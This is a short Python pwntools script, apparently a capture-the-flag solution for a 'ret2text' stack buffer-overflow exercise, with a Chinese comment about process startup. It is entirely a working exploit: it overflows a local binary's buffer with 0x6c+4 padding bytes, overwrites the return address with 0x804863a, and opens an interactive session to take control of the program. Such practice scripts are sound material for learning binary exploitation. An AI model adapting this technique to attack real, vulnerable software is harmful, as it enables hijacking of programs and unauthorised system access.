##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
# 申请进程后就会开始执行！
# gdb.attach(sh)
target = 0x804863a
sh.sendline(b'A' * (0x6c + 4) + p32(target))
sh.interactive()
